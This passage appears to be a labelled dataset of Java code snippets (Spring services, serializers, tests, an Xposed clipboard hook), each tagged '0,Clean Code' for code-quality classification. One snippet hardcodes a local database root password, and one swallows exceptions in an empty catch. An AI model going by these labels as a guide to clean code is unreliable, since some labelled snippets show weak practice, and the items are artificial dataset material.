    }
    public ClipData getStashPrimaryClip(){
      ClipData res=(ClipData)XposedHelpers.callMethod(stockManager,""getStashPrimaryClip"");
      XLog.d(""getStashPrimaryClip: "" + res);
      return res;
    }
    public void pushClipboardRuleData(    ParceledListSlice clipboardRuleInfo){
      XposedHelpers.callMethod(stockManager,""pushClipboardRuleData"",clipboardRuleInfo);
    }
    public ClipDescription getPrimaryClipDescription(){
      return super.getPrimaryClipDescription();
    }
  }
}
",0,Clean Code
"/** 
 * {@link Java8TimeSerializerFactory}<p>
 * @author zhaoyb1990
 */
public class Java8TimeSerializerFactory extends AbstractSerializerFactory {
  private Map<Class<?>,Serializer> serializerMap=new HashMap<Class<?>,Serializer>();
{
    try {
      serializerMap.put(Class.forName(""java.time.LocalTime""),Java8TimeSerializer.create(LocalTimeHandle.class));
      serializerMap.put(Class.forName(""java.time.LocalDate""),Java8TimeSerializer.create(LocalDateHandle.class));
      serializerMap.put(Class.forName(""java.time.LocalDateTime""),Java8TimeSerializer.create(LocalDateTimeHandle.class));
      serializerMap.put(Class.forName(""java.time.Instant""),Java8TimeSerializer.create(InstantHandle.class));
      serializerMap.put(Class.forName(""java.time.Duration""),Java8TimeSerializer.create(DurationHandle.class));
      serializerMap.put(Class.forName(""java.time.Period""),Java8TimeSerializer.create(PeriodHandle.class));
      serializerMap.put(Class.forName(""java.time.Year""),Java8TimeSerializer.create(YearHandle.class));
      serializerMap.put(Class.forName(""java.time.YearMonth""),Java8TimeSerializer.create(YearMonthHandle.class));
      serializerMap.put(Class.forName(""java.time.MonthDay""),Java8TimeSerializer.create(MonthDayHandle.class));
      serializerMap.put(Class.forName(""java.time.OffsetDateTime""),Java8TimeSerializer.create(OffsetDateTimeHandle.class));
      serializerMap.put(Class.forName(""java.time.ZoneOffset""),Java8TimeSerializer.create(ZoneOffsetHandle.class));
      serializerMap.put(Class.forName(""java.time.OffsetTime""),Java8TimeSerializer.create(OffsetTimeHandle.class));
      serializerMap.put(Class.forName(""java.time.ZonedDateTime""),Java8TimeSerializer.create(ZonedDateTimeHandle.class));
      serializerMap.put(Class.forName(""java.util.Locale""),Java8TimeSerializer.create(LocaleHandle.class));
    }
 catch (    Exception e) {
    }
  }
  @Override public Serializer getSerializer(  Class cl) throws HessianProtocolException {
    return serializerMap.get(cl);
  }
  @Override public Deserializer getDeserializer(  Class cl) throws HessianProtocolException {
    return null;
  }
}
",0,Clean Code
"private static final class Processor {
  Processor(){
  }
  void process(  ConfigurableListableBeanFactory beanFactory,  NativeConfigurationRegistry registry){
    Set<Class<?>> avroTypes=new HashSet<>();
    new BeanFactoryProcessor(beanFactory).processBeans(this::isCandidate,(beanName,beanType) -> {
      if (GenericMessageListener.class.isAssignableFrom(beanType)) {
        ReflectionUtils.doWithMethods(beanType,method -> {
          Type[] types=method.getGenericParameterTypes();
          if (types.length > 0) {
            ResolvableType resolvableType=ResolvableType.forType(types[0]);
            Class<?> keyType=resolvableType.resolveGeneric(0);
            Class<?> valueType=resolvableType.resolveGeneric(1);
            checkType(keyType,avroTypes);
            checkType(valueType,avroTypes);
          }
        }
,method -> method.getName().equals(""onMessage""));
      }
 else {
        processMethods(beanType,avroTypes);
      }
    }
);
    avroTypes.forEach(avroType -> registry.reflection().forType(avroType).withAccess(TypeAccess.DECLARED_CONSTRUCTORS));
  }
  private boolean isCandidate(  Class<?> type){
    return isListener(type) || hasListenerMethods(type);
  }
}
",0,Clean Code
"/** 
 * Abort file
 * @author boyan(boyan@antfin.com)
 */
public class AbortFile {
  private final String path;
  public String getPath(){
    return this.path;
  }
  public AbortFile(  final String path){
    super();
    this.path=path;
  }
  public boolean create() throws IOException {
    final File file=new File(this.path);
    if (file.createNewFile()) {
      writeDate();
      return true;
    }
 else {
      return false;
    }
  }
  @SuppressWarnings(""deprecation"") private void writeDate() throws IOException {
    final File file=new File(this.path);
    try (final FileWriter writer=new FileWriter(file,false)){
      writer.write(new Date().toGMTString());
      writer.write(System.lineSeparator());
    }
   }
  public void touch() throws IOException {
    writeDate();
  }
  public boolean exists(){
    final File file=new File(this.path);
    return file.isFile() && file.exists();
  }
  public boolean destroy(){
    return new File(this.path).delete();
  }
}
",0,Clean Code
"/** 
 * This interface defines a complete listener for a parse tree produced by {@link PropertiesParser}.
 */
public interface PropertiesListener extends ParseTreeListener {
  /** 
 * Enter a parse tree produced by  {@link PropertiesParser#propertiesFile}.
 * @param ctx the parse tree
 */
  void enterPropertiesFile(  PropertiesParser.PropertiesFileContext ctx);
  /** 
 * Exit a parse tree produced by  {@link PropertiesParser#propertiesFile}.
 * @param ctx the parse tree
 */
  void exitPropertiesFile(  PropertiesParser.PropertiesFileContext ctx);
  /** 
 * Enter a parse tree produced by  {@link PropertiesParser#row}.
 * @param ctx the parse tree
 */
  void enterRow(  PropertiesParser.RowContext ctx);
  /** 
 * Exit a parse tree produced by  {@link PropertiesParser#row}.
 * @param ctx the parse tree
 */
  void exitRow(  PropertiesParser.RowContext ctx);
  /** 
 * Enter a parse tree produced by  {@link PropertiesParser#decl}.
 * @param ctx the parse tree
 */
  void enterDecl(  PropertiesParser.DeclContext ctx);
  /** 
 * Exit a parse tree produced by  {@link PropertiesParser#decl}.
 * @param ctx the parse tree
 */
  void exitDecl(  PropertiesParser.DeclContext ctx);
  /** 
 * Enter a parse tree produced by  {@link PropertiesParser#key}.
 * @param ctx the parse tree
 */
  void enterKey(  PropertiesParser.KeyContext ctx);
  /** 
 * Exit a parse tree produced by  {@link PropertiesParser#key}.
 * @param ctx the parse tree
 */
  void exitKey(  PropertiesParser.KeyContext ctx);
  /** 
 * Enter a parse tree produced by  {@link PropertiesParser#value}.
 * @param ctx the parse tree
 */
  void enterValue(  PropertiesParser.ValueContext ctx);
  /** 
 * Exit a parse tree produced by  {@link PropertiesParser#value}.
 * @param ctx the parse tree
 */
  void exitValue(  PropertiesParser.ValueContext ctx);
  /** 
 * Enter a parse tree produced by  {@link PropertiesParser#comment}.
 * @param ctx the parse tree
 */
  void enterComment(  PropertiesParser.CommentContext ctx);
  /** 
 * Exit a parse tree produced by  {@link PropertiesParser#comment}.
 * @param ctx the parse tree
 */
  void exitComment(  PropertiesParser.CommentContext ctx);
}
",0,Clean Code
"/** 
 * A  {@link TranslatorFactory} that creates a {@link Sam2Translator} instance. 
 */
public class Sam2TranslatorFactory implements TranslatorFactory, Serializable {
  private static final long serialVersionUID=1L;
  private static final Set<Pair<Type,Type>> SUPPORTED_TYPES=new HashSet<>();
static {
    SUPPORTED_TYPES.add(new Pair<>(Sam2Input.class,DetectedObjects.class));
    SUPPORTED_TYPES.add(new Pair<>(Input.class,Output.class));
  }
  /** 
 * {@inheritDoc} 
 */
  @Override @SuppressWarnings(""unchecked"") public <I,O>Translator<I,O> newInstance(  Class<I> input,  Class<O> output,  Model model,  Map<String,?> arguments){
    if (input == Sam2Input.class && output == DetectedObjects.class) {
      return (Translator<I,O>)Sam2Translator.builder(arguments).build();
    }
 else     if (input == Input.class && output == Output.class) {
      Sam2Translator translator=Sam2Translator.builder(arguments).build();
      return (Translator<I,O>)new Sam2ServingTranslator(translator);
    }
    throw new IllegalArgumentException(""Unsupported input/output types."");
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Set<Pair<Type,Type>> getSupportedTypes(){
    return SUPPORTED_TYPES;
  }
}
",0,Clean Code
"/** 
 * 用户分组 Service 实现类
 * @author owen
 */
@Service @Validated public class MemberGroupServiceImpl implements MemberGroupService {
  @Resource private MemberGroupMapper memberGroupMapper;
  @Resource private MemberUserService memberUserService;
  @Override public Long createGroup(  MemberGroupCreateReqVO createReqVO){
    MemberGroupDO group=MemberGroupConvert.INSTANCE.convert(createReqVO);
    memberGroupMapper.insert(group);
    return group.getId();
  }
  @Override public void updateGroup(  MemberGroupUpdateReqVO updateReqVO){
    validateGroupExists(updateReqVO.getId());
    MemberGroupDO updateObj=MemberGroupConvert.INSTANCE.convert(updateReqVO);
    memberGroupMapper.updateById(updateObj);
  }
  @Override public void deleteGroup(  Long id){
    validateGroupExists(id);
    validateGroupHasUser(id);
    memberGroupMapper.deleteById(id);
  }
  void validateGroupExists(  Long id){
    if (memberGroupMapper.selectById(id) == null) {
      throw exception(GROUP_NOT_EXISTS);
    }
  }
  void validateGroupHasUser(  Long id){
    Long count=memberUserService.getUserCountByGroupId(id);
    if (count > 0) {
      throw exception(GROUP_HAS_USER);
    }
  }
  @Override public MemberGroupDO getGroup(  Long id){
    return memberGroupMapper.selectById(id);
  }
  @Override public List<MemberGroupDO> getGroupList(  Collection<Long> ids){
    if (CollUtil.isEmpty(ids)) {
      return ListUtil.empty();
    }
    return memberGroupMapper.selectBatchIds(ids);
  }
  @Override public PageResult<MemberGroupDO> getGroupPage(  MemberGroupPageReqVO pageReqVO){
    return memberGroupMapper.selectPage(pageReqVO);
  }
  @Override public List<MemberGroupDO> getGroupListByStatus(  Integer status){
    return memberGroupMapper.selectListByStatus(status);
  }
}
",0,Clean Code
"/** 
 * 短信渠道 Service 实现类
 * @author zzf
 */
@Service @Slf4j public class SmsChannelServiceImpl implements SmsChannelService {
  @Resource private SmsClientFactory smsClientFactory;
  @Resource private SmsChannelMapper smsChannelMapper;
  @Resource private SmsTemplateService smsTemplateService;
  @Override public Long createSmsChannel(  SmsChannelSaveReqVO createReqVO){
    SmsChannelDO channel=BeanUtils.toBean(createReqVO,SmsChannelDO.class);
    smsChannelMapper.insert(channel);
    return channel.getId();
  }
  @Override public void updateSmsChannel(  SmsChannelSaveReqVO updateReqVO){
    validateSmsChannelExists(updateReqVO.getId());
    SmsChannelDO updateObj=BeanUtils.toBean(updateReqVO,SmsChannelDO.class);
    smsChannelMapper.updateById(updateObj);
  }
  @Override public void deleteSmsChannel(  Long id){
    validateSmsChannelExists(id);
    if (smsTemplateService.getSmsTemplateCountByChannelId(id) > 0) {
      throw exception(SMS_CHANNEL_HAS_CHILDREN);
    }
    smsChannelMapper.deleteById(id);
  }
  private SmsChannelDO validateSmsChannelExists(  Long id){
    SmsChannelDO channel=smsChannelMapper.selectById(id);
    if (channel == null) {
      throw exception(SMS_CHANNEL_NOT_EXISTS);
    }
    return channel;
  }
  @Override public SmsChannelDO getSmsChannel(  Long id){
    return smsChannelMapper.selectById(id);
  }
  @Override public List<SmsChannelDO> getSmsChannelList(){
    return smsChannelMapper.selectList();
  }
  @Override public PageResult<SmsChannelDO> getSmsChannelPage(  SmsChannelPageReqVO pageReqVO){
    return smsChannelMapper.selectPage(pageReqVO);
  }
  @Override public SmsClient getSmsClient(  Long id){
    SmsChannelDO channel=smsChannelMapper.selectById(id);
    SmsChannelProperties properties=BeanUtils.toBean(channel,SmsChannelProperties.class);
    return smsClientFactory.createOrUpdateSmsClient(properties);
  }
  @Override public SmsClient getSmsClient(  String code){
    return smsClientFactory.getSmsClient(code);
  }
}
",0,Clean Code
"/** 
 * The  {@link ai.djl.translate.Translator} for PyTorch GPT2 model. 
 */
public class OrtGptTranslator implements NoBatchifyTranslator<NDList,CausalLMOutput> {
  private long kvDim;
  private int numAttentionHeads;
  private int numLayers;
  /** 
 * Constructs a new instance of  {@code PtGptTranslator}.
 * @param kvDim the kv dimension
 * @param numAttentionHeads the number of attention heads
 * @param numLayers the number of layers
 */
  public OrtGptTranslator(  long kvDim,  int numAttentionHeads,  int numLayers){
    this.kvDim=kvDim;
    this.numAttentionHeads=numAttentionHeads;
    this.numLayers=numLayers;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public NDList processInput(  TranslatorContext ctx,  NDList input) throws Exception {
    NDManager manager=ctx.getNDManager();
    NDArray inputIds=input.get(0);
    inputIds.setName(""input_ids"");
    NDArray attentionMask=input.get(2);
    attentionMask.setName(""attention_mask"");
    NDList inputNew;
    if (input.size() == 3) {
      NDArray useCacheBranch=manager.create(new boolean[]{false},new Shape(1));
      useCacheBranch.setName(""use_cache_branch"");
      inputNew=new NDList(inputIds,attentionMask,useCacheBranch);
      initialDummyPastKeyValues(inputIds,manager,inputNew);
    }
 else {
      NDArray useCacheBranch=manager.create(new boolean[]{true},new Shape(1));
      useCacheBranch.setName(""use_cache_branch"");
      inputNew=new NDList(inputIds,attentionMask,useCacheBranch);
      inputNew.addAll(input.subNDList(3));
    }
    int offset=3;
    for (int i=offset; i < numLayers * 2 + offset; i+=2) {
      int order=(i - offset) / 2;
      inputNew.get(i).setName(String.format(""past_key_values.%s.key"",order));
      inputNew.get(i + 1).setName(String.format(""past_key_values.%s.value"",order));
    }
    return inputNew;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public CausalLMOutput processOutput(  TranslatorContext ctx,  NDList output) throws Exception {
    return new CausalLMOutput(output.get(0),output.subNDList(1));
  }
  private void initialDummyPastKeyValues(  NDArray inputIds,  NDManager manager,  NDList list){
    long numBatch=inputIds.getShape().get(0);
    for (int i=0; i < numLayers * 2; ++i) {
      NDArray array=manager.zeros(new Shape(numBatch,numAttentionHeads,1,kvDim));
      list.add(array);
    }
  }
}
",0,Clean Code
"/** 
 * 代码生成器
 * @author xiongxiaoyang
 * @date 2022/5/11
 */
public class Generator {
  private static final String USERNAME=System.getenv().get(""USER"");
  /** 
 * 项目信息
 */
  private static final String PROJECT_PATH=System.getProperty(""user.dir"");
  private static final String JAVA_PATH=""/src/main/java"";
  private static final String RESOURCE_PATH=""/src/main/resources"";
  private static final String BASE_PACKAGE=""io.github.xxyopen.novel"";
  /** 
 * 数据库信息
 */
  private static final String DATABASE_IP=""127.0.0.1"";
  private static final String DATABASE_PORT=""3306"";
  private static final String DATABASE_NAME=""novel"";
  private static final String DATABASE_USERNAME=""root"";
  private static final String DATABASE_PASSWORD=""test123456"";
  public static void main(  String[] args){
    genCode(""sys_user"");
  }
  /** 
 * 代码生成
 */
  private static void genCode(  String tables){
    FastAutoGenerator.create(String.format(""jdbc:mysql://%s:%s/%s?useUnicode=true&characterEncoding=utf-8&useSSL=false&serverTimezone=Asia/Shanghai"",DATABASE_IP,DATABASE_PORT,DATABASE_NAME),DATABASE_USERNAME,DATABASE_PASSWORD).globalConfig(builder -> {
      builder.author(USERNAME).fileOverride().fileOverride().commentDate(""yyyy/MM/dd"").outputDir(PROJECT_PATH + JAVA_PATH);
    }
).packageConfig(builder -> builder.parent(BASE_PACKAGE).entity(""dao.entity"").service(""service"").serviceImpl(""service.impl"").mapper(""dao.mapper"").controller(""controller.front"").pathInfo(Collections.singletonMap(OutputFile.mapperXml,PROJECT_PATH + RESOURCE_PATH + ""/mapper""))).templateConfig(builder -> builder.disable(TemplateType.SERVICE).disable(TemplateType.SERVICEIMPL).disable(TemplateType.CONTROLLER)).strategyConfig(builder -> builder.addInclude(getTables(tables)).controllerBuilder().enableRestStyle().serviceBuilder().formatServiceFileName(""%sService"")).execute();
  }
  /** 
 * 处理 all 和多表情况
 */
  protected static List<String> getTables(  String tables){
    return ""all"".equals(tables) ? Collections.emptyList() : Arrays.asList(tables.split("",""));
  }
}
",0,Clean Code
"@EnvTest class PlayerResourcePackIntegrationTest {
  private static final ResourcePackInfo INFO=ResourcePackInfo.resourcePackInfo(UUID.randomUUID(),URI.create(""http://localhost:8080/missing.zip""),""i am not a hash!"");
  @Test void applyCallbackOnSuccess(  Env env){
    var instance=env.createFlatInstance();
    var player=env.createPlayer(instance,new Pos(0,40,0));
    AtomicBoolean called=new AtomicBoolean();
    ResourcePackCallback callback=(uuid,resourcePackStatus,audience) -> called.set(true);
    player.sendResourcePacks(resourcePackRequest().callback(callback).packs(INFO).build());
    player.addPacketToQueue(new ClientResourcePackStatusPacket(INFO.id(),ResourcePackStatus.SUCCESSFULLY_LOADED));
    player.interpretPacketQueue();
    assertTrue(called.get());
    assertTrue(player.isOnline());
  }
  @Test void applyFailRequiredKicksPlayer(  Env env){
    var instance=env.createFlatInstance();
    var player=env.createPlayer(instance,new Pos(0,40,0));
    player.sendResourcePacks(resourcePackRequest().required(true).packs(INFO).build());
    player.addPacketToQueue(new ClientResourcePackStatusPacket(INFO.id(),ResourcePackStatus.FAILED_RELOAD));
    player.interpretPacketQueue();
    assertFalse(player.isOnline());
  }
  @Test void applyFailNotRequiredDoesNotKickPlayer(  Env env){
    var instance=env.createFlatInstance();
    var player=env.createPlayer(instance,new Pos(0,40,0));
    player.sendResourcePacks(resourcePackRequest().required(false).packs(INFO).build());
    player.addPacketToQueue(new ClientResourcePackStatusPacket(INFO.id(),ResourcePackStatus.FAILED_RELOAD));
    player.interpretPacketQueue();
    assertTrue(player.isOnline());
  }
}
",0,Clean Code
"public class BlockPropertiesTest {
  @Test public void empty(){
    assertEquals(Map.of(),parseProperties(""[]""));
    assertEquals(Map.of(),parseProperties(""""));
  }
  @Test public void noBrackets(){
    assertEquals(Map.of(),parseProperties(""random test without brackets""));
    assertEquals(Map.of(),parseProperties(""[""));
    assertEquals(Map.of(),parseProperties(""[end""));
    assertEquals(Map.of(),parseProperties(""[random test without end bracket""));
    assertEquals(Map.of(),parseProperties(""]""));
    assertEquals(Map.of(),parseProperties(""start]""));
    assertEquals(Map.of(),parseProperties(""random test without start bracket]""));
  }
  @Test public void spaces(){
    assertEquals(Map.of(),parseProperties(""[    ]""));
  }
  @Test public void comma(){
    assertEquals(Map.of(),parseProperties(""[  , , ,,,,  ]""));
  }
  @Test public void single(){
    assertEquals(Map.of(""facing"",""east""),parseProperties(""[facing=east]""));
  }
  @Test public void doubleSpace(){
    assertEquals(Map.of(""facing"",""east"",""key"",""value""),parseProperties(""[facing=east,key=value ]""));
    assertEquals(Map.of(""facing"",""east"",""key"",""value""),parseProperties(""[ facing = east, key= value ]""));
  }
  @Test public void allLengths(){
    for (int i=0; i < 13; i++) {
      StringBuilder properties=new StringBuilder(""["");
      for (int j=0; j < i; j++) {
        properties.append(""key"").append(j).append(""=value"").append(j);
        if (j != i - 1)         properties.append("","");
      }
      properties.append(""]"");
      var map=parseProperties(properties.toString());
      assertEquals(i,map.size());
      for (int j=0; j < i; j++) {
        assertEquals(""value"" + j,map.get(""key"" + j));
      }
    }
  }
  @Test public void corrupted(){
    final int size=12;
    StringBuilder properties=new StringBuilder(""["");
    for (int j=0; j < size; j++) {
      properties.append(""key"").append(j).append(""=value"").append(j);
      if (j != size - 1)       properties.append("","");
    }
    properties.append("", , ,]"");
    var map=parseProperties(properties.toString());
    assertEquals(size,map.size());
    for (int j=0; j < size; j++) {
      assertEquals(""value"" + j,map.get(""key"" + j));
    }
  }
}
",0,Clean Code
"public class MessageUtils {
  private static final Logger LOGGER=LoggerFactory.getLogger(MessageUtils.class);
  public static <T>T getBean(  Class<T> tClass){
    T t=null;
    ApplicationContext applicationContext=DataWorkCloudApplication.getApplicationContext();
    if (applicationContext != null) {
      try {
        t=applicationContext.getBean(tClass);
      }
 catch (      NoSuchBeanDefinitionException e) {
        LOGGER.warn(String.format(""can not get bean from spring ioc:%s"",tClass.getName()));
      }
    }
    return t;
  }
  public static boolean isAssignableFrom(  String supperClassName,  String className){
    try {
      return Class.forName(supperClassName).isAssignableFrom(Class.forName(className));
    }
 catch (    ClassNotFoundException e) {
      LOGGER.error(""class not found"",e);
      return false;
    }
  }
  /** 
 * find the MethodExecuteWrappers have the min order number in the MethodExecuteWrapper list
 * @param methodExecuteWrappers the MethodExecuteWrapper list
 * @return the min MethodExecuteWrapper list
 */
  public static List<MethodExecuteWrapper> getMinOrders(  List<MethodExecuteWrapper> methodExecuteWrappers){
    if (methodExecuteWrappers == null || methodExecuteWrappers.isEmpty()) {
      return Collections.emptyList();
    }
    MethodExecuteWrapper minOrderMethodExecute=methodExecuteWrappers.get(0);
    for (    MethodExecuteWrapper tmp : methodExecuteWrappers) {
      if (tmp.getOrder() < minOrderMethodExecute.getOrder()) {
        minOrderMethodExecute=tmp;
      }
    }
    List<MethodExecuteWrapper> result=new ArrayList<>();
    for (    MethodExecuteWrapper tmp : methodExecuteWrappers) {
      if (tmp.getOrder() == minOrderMethodExecute.getOrder()) {
        result.add(tmp);
      }
    }
    return result;
  }
  /** 
 * if the order number is the last/max number in the serviceMethod
 * @param order the order number
 * @param serviceMethods the service methods
 * @return if the input order is the last/max order number
 */
  public static boolean orderIsLast(  int order,  List<ServiceMethod> serviceMethods){
    if (order == Integer.MAX_VALUE) {
      return true;
    }
    for (    ServiceMethod serviceMethod : serviceMethods) {
      if (serviceMethod.getOrder() > order) {
        return false;
      }
    }
    return true;
  }
  /** 
 * find the first repeated order number, if there have no repeated order number return null
 * @param serviceMethods serviceMethods
 * @return the repeated order number
 */
  public static Integer repeatOrder(  List<ServiceMethod> serviceMethods){
    Set<Integer> tmp=new HashSet<>();
    for (    ServiceMethod serviceMethod : serviceMethods) {
      int order=serviceMethod.getOrder();
      if (tmp.contains(order)) {
        return order;
      }
 else {
        tmp.add(order);
      }
    }
    return null;
  }
}",0,Clean Code
"/** 
 * Instruction format  {@code 31t}. See the instruction format spec for details.
 */
public final class Form31t extends InsnFormat {
  /** 
 * {@code non-null;} unique instance of this class 
 */
  public static final InsnFormat THE_ONE=new Form31t();
  /** 
 * Constructs an instance. This class is not publicly instantiable. Use  {@link #THE_ONE}.
 */
  private Form31t(){
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String insnArgString(  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    return regs.get(0).regString() + "", "" + branchString(insn);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String insnCommentString(  DalvInsn insn,  boolean noteIndices){
    return branchComment(insn);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int codeSize(){
    return 3;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean isCompatible(  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    if (!((insn instanceof TargetInsn) && (regs.size() == 1) && unsignedFitsInByte(regs.get(0).getReg()))) {
      return false;
    }
    return true;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public BitSet compatibleRegs(  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    BitSet bits=new BitSet(1);
    bits.set(0,unsignedFitsInByte(regs.get(0).getReg()));
    return bits;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean branchFits(  TargetInsn insn){
    return true;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void writeTo(  AnnotatedOutput out,  DalvInsn insn){
    RegisterSpecList regs=insn.getRegisters();
    int offset=((TargetInsn)insn).getTargetOffset();
    write(out,opcodeUnit(insn,regs.get(0).getReg()),offset);
  }
}
",0,Clean Code
"/** 
 * A helper class for reading and writing Services files. 
 */
final class ServicesFiles {
  public static final String SERVICES_PATH=""META-INF/services"";
  private ServicesFiles(){
  }
  /** 
 * Returns an absolute path to a service file given the class name of the service.
 * @param serviceName not {@code null}
 * @return SERVICES_PATH + serviceName
 */
  static String getPath(  String serviceName){
    return SERVICES_PATH + ""/"" + serviceName;
  }
  /** 
 * Reads the set of service classes from a service file.
 * @param input not {@code null}. Closed after use.
 * @return a not {@code null Set} of service class names.
 * @throws IOException
 */
  static Set<String> readServiceFile(  InputStream input) throws IOException {
    Set<String> serviceClasses=new HashSet<String>();
    try (BufferedReader reader=new BufferedReader(new InputStreamReader(input,StandardCharsets.UTF_8))){
      String line;
      while ((line=reader.readLine()) != null) {
        int commentStart=line.indexOf('#');
        if (commentStart >= 0) {
          line=line.substring(0,commentStart);
        }
        line=line.trim();
        if (!line.isEmpty()) {
          serviceClasses.add(line);
        }
      }
      return serviceClasses;
    }
   }
  /** 
 * Writes the set of service class names to a service file.
 * @param output not {@code null}. Not closed after use.
 * @param services a not {@code null Collection} of service class names.
 * @throws IOException
 */
  static void writeServiceFile(  Collection<String> services,  OutputStream output) throws IOException {
    BufferedWriter writer=new BufferedWriter(new OutputStreamWriter(output,StandardCharsets.UTF_8));
    for (    String service : services) {
      writer.write(service);
      writer.write('\n');
    }
    writer.flush();
  }
}
",0,Clean Code
"/** 
 * Sends an article to search engine.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 1.1.3.3, Aug 31, 2018
 * @since 1.4.0
 */
@Singleton public class ArticleSearchAdder extends AbstractEventListener<JSONObject> {
  /** 
 * Logger.
 */
  private static final Logger LOGGER=LogManager.getLogger(ArticleSearchAdder.class);
  /** 
 * Search management service.
 */
  @Inject private SearchMgmtService searchMgmtService;
  @Override public void action(  final Event<JSONObject> event){
    final JSONObject data=event.getData();
    LOGGER.log(Level.TRACE,""Processing an event [type={}, data={}]"",event.getType(),data);
    final JSONObject article=data.optJSONObject(Article.ARTICLE);
    if (Article.ARTICLE_TYPE_C_DISCUSSION == article.optInt(Article.ARTICLE_TYPE) || Article.ARTICLE_TYPE_C_THOUGHT == article.optInt(Article.ARTICLE_TYPE)) {
      return;
    }
    final String tags=article.optString(Article.ARTICLE_TAGS);
    if (StringUtils.containsIgnoreCase(tags,Tag.TAG_TITLE_C_SANDBOX)) {
      return;
    }
    if (Symphonys.ALGOLIA_ENABLED) {
      searchMgmtService.updateAlgoliaDocument(JSONs.clone(article));
    }
    if (Symphonys.ES_ENABLED) {
      searchMgmtService.updateESDocument(JSONs.clone(article),Article.ARTICLE);
    }
  }
  /** 
 * Gets the event type  {@linkplain EventTypes#ADD_ARTICLE}.
 * @return event type
 */
  @Override public String getEventType(){
    return EventTypes.ADD_ARTICLE;
  }
}
",0,Clean Code
"private static final class HashedWheelTimeout implements Timeout {
  private static final int ST_INIT=0;
  private static final int ST_CANCELLED=1;
  private static final int ST_EXPIRED=2;
  private static final AtomicIntegerFieldUpdater<HashedWheelTimeout> STATE_UPDATER=AtomicIntegerFieldUpdater.newUpdater(HashedWheelTimeout.class,""state"");
  private final HashedWheelTimer timer;
  private final TimerTask task;
  private final long deadline;
  @SuppressWarnings({""unused"",""FieldMayBeFinal"",""RedundantFieldInitialization""}) private volatile int state=ST_INIT;
  long remainingRounds;
  HashedWheelTimeout next;
  HashedWheelTimeout prev;
  HashedWheelBucket bucket;
  HashedWheelTimeout(  HashedWheelTimer timer,  TimerTask task,  long deadline){
    this.timer=timer;
    this.task=task;
    this.deadline=deadline;
  }
  @Override public Timer timer(){
    return timer;
  }
  @Override public TimerTask task(){
    return task;
  }
  @Override public boolean cancel(){
    if (!compareAndSetState(ST_INIT,ST_CANCELLED)) {
      return false;
    }
    timer.cancelledTimeouts.add(this);
    return true;
  }
  void remove(){
    HashedWheelBucket bucket=this.bucket;
    if (bucket != null) {
      bucket.remove(this);
    }
 else {
      timer.pendingTimeouts.decrementAndGet();
    }
  }
  public boolean compareAndSetState(  int expected,  int state){
    return STATE_UPDATER.compareAndSet(this,expected,state);
  }
  public int state(){
    return state;
  }
  @Override public boolean isCancelled(){
    return state() == ST_CANCELLED;
  }
  @Override public boolean isExpired(){
    return state() == ST_EXPIRED;
  }
  public void expire(){
    if (!compareAndSetState(ST_INIT,ST_EXPIRED)) {
      return;
    }
    try {
      task.run(this);
    }
 catch (    Throwable t) {
      if (LOG.isWarnEnabled()) {
        LOG.warn(""An exception was thrown by "" + TimerTask.class.getSimpleName() + '.',t);
      }
    }
  }
  @Override public String toString(){
    final long currentTime=System.nanoTime();
    long remaining=deadline - currentTime + timer.startTime;
    StringBuilder buf=new StringBuilder(192).append(getClass().getSimpleName()).append('(').append(""deadline: "");
    if (remaining > 0) {
      buf.append(remaining).append("" ns later"");
    }
 else     if (remaining < 0) {
      buf.append(-remaining).append("" ns ago"");
    }
 else {
      buf.append(""now"");
    }
    if (isCancelled()) {
      buf.append("", cancelled"");
    }
    return buf.append("", task: "").append(task()).append(')').toString();
  }
}",0,Clean Code
"public class BpmTaskAssignLeaderExpressionTest extends BaseMockitoUnitTest {
  @InjectMocks private BpmTaskAssignLeaderExpression expression;
  @Mock private AdminUserApi adminUserApi;
  @Mock private DeptApi deptApi;
  @Mock private BpmProcessInstanceService processInstanceService;
  @Test public void testCalculateUsers_noDept(){
    DelegateExecution execution=mockDelegateExecution(1L);
    AdminUserRespDTO startUser=randomPojo(AdminUserRespDTO.class,o -> o.setDeptId(10L));
    when(adminUserApi.getUser(eq(1L))).thenReturn(success(startUser));
    when(deptApi.getDept(eq(10L))).thenReturn(success(null));
    Set<Long> result=expression.calculateUsers(execution,1);
    assertEquals(0,result.size());
  }
  @Test public void testCalculateUsers_noParentDept(){
    DelegateExecution execution=mockDelegateExecution(1L);
    AdminUserRespDTO startUser=randomPojo(AdminUserRespDTO.class,o -> o.setDeptId(10L));
    when(adminUserApi.getUser(eq(1L))).thenReturn(success(startUser));
    DeptRespDTO startUserDept=randomPojo(DeptRespDTO.class,o -> o.setId(10L).setParentId(100L).setLeaderUserId(20L));
    when(deptApi.getDept(eq(10L))).thenReturn(success(startUserDept));
    when(deptApi.getDept(eq(100L))).thenReturn(success(null));
    Set<Long> result=expression.calculateUsers(execution,2);
    assertEquals(asSet(20L),result);
  }
  @Test public void testCalculateUsers_existParentDept(){
    DelegateExecution execution=mockDelegateExecution(1L);
    AdminUserRespDTO startUser=randomPojo(AdminUserRespDTO.class,o -> o.setDeptId(10L));
    when(adminUserApi.getUser(eq(1L))).thenReturn(success(startUser));
    DeptRespDTO startUserDept=randomPojo(DeptRespDTO.class,o -> o.setId(10L).setParentId(100L).setLeaderUserId(20L));
    when(deptApi.getDept(eq(10L))).thenReturn(success(startUserDept));
    DeptRespDTO parentDept=randomPojo(DeptRespDTO.class,o -> o.setId(100L).setParentId(1000L).setLeaderUserId(200L));
    when(deptApi.getDept(eq(100L))).thenReturn(success(parentDept));
    Set<Long> result=expression.calculateUsers(execution,2);
    assertEquals(asSet(200L),result);
  }
  @SuppressWarnings(""SameParameterValue"") private DelegateExecution mockDelegateExecution(  Long startUserId){
    ExecutionEntityImpl execution=new ExecutionEntityImpl();
    execution.setProcessInstanceId(randomString());
    ExecutionEntityImpl processInstance=new ExecutionEntityImpl();
